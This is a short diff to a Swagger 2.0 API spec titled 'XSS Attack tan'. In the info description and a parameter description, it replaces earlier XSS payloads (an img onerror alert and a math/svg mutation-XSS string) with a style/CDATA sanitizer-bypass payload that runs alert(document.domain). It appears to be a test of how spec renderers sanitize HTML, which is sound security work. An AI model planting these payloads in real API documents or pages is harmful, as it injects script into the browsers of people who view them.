@@ -2,7 +2,7 @@ swagger: "2.0"
 info:
   title: XSS Attack tan
   description: |
-    xssnih<img src=x onerror=alert(123)>
+    <style><![CDATA[</style><div data-x="]]></style><img src=x onerror=alert(document.domain)><style><!--"></div><style>--></style></div>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            a<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title="</style><img src='#' onerror='alert(1)'>">
+            a<style><![CDATA[</style><div data-x="]]></style><img src=x onerror=alert(document.domain)><style><!--"></div><style>--></style></div>
 
           format: int64
           in: path
